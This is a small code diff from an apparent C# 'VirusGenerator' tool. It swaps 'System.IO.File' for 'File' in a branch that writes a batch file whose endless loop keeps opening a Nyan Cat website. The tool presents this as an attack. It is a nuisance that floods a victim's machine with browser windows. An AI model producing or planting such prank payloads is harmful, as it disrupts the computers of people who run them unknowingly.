@@ -90,7 +90,7 @@ namespace VirusGenerator
                 if (_fileExt == ".bat")
                 {
                     string[] nyanCatCmd = { "@echo off", ":loop", "start http://www.nyancat.com", "goto loop" };
-                    System.IO.File.WriteAllLines(_outputFolder + _fileName + _fileExt, nyanCatCmd);
+                    File.WriteAllLines(_outputFolder + _fileName + _fileExt, nyanCatCmd);
                 }
                 else
                     MessageBox.Show("Unfortunately this attack only works in a '.bat' format. Select that and re-generate.");
